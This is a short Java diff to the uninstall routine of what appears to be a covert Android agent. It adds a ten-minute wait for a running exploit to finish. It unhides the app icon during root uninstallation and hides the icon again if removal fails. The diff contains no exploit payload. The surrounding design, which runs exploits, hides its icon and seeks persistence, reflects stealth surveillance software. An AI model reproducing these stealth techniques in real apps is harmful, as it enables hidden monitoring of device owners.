@@ -62,7 +62,7 @@ public class UninstallAction extends SubActionSlow {
 	/**
 	 * Actual execute.
 	 */
-	public static boolean actualExecute() {
+	public static boolean actualExecute(boolean waitExploit) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
 		}
@@ -74,6 +74,23 @@ public class UninstallAction extends SubActionSlow {
 			if(Status.getExploitStatus()==Status.EXPLOIT_STATUS_RUNNING) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualExecute), exploit still running...you have to wait");
+				}
+				//wait max 10minutes
+				int seconds2try = 600;
+				while (waitExploit && Status.getExploitStatus() == Status.EXPLOIT_STATUS_RUNNING){
+					Check.log(TAG + " (actualExecute).");
+					try {
+						Thread.sleep(1000);
+					}catch(Exception e){
+						continue;
+					}
+					seconds2try--;
+					if(seconds2try==0){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (actualExecute), tne minutes timed out, just exit..");
+						}
+						break;
+					}
 				}
 				return false;
 			}
@@ -189,15 +206,19 @@ public class UninstallAction extends SubActionSlow {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) try Root");
 			}
+			// unhide the icon
+			Status.setIconState(false);
 			ret = deleteApplicationRoot();
-			Status.setIconState(!ret);
+			if(ret == false){
+				// disistallation failed hide again the icon 
+				Status.setIconState(true);
+			}
 		}
 
 		if (Status.getPersistencyStatus()<= Status.PERSISTENCY_STATUS_FAILED) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) go with intent");
 			}
-			Status.setIconState(false);
 			ret = deleteApplicationIntent();
 		}
 
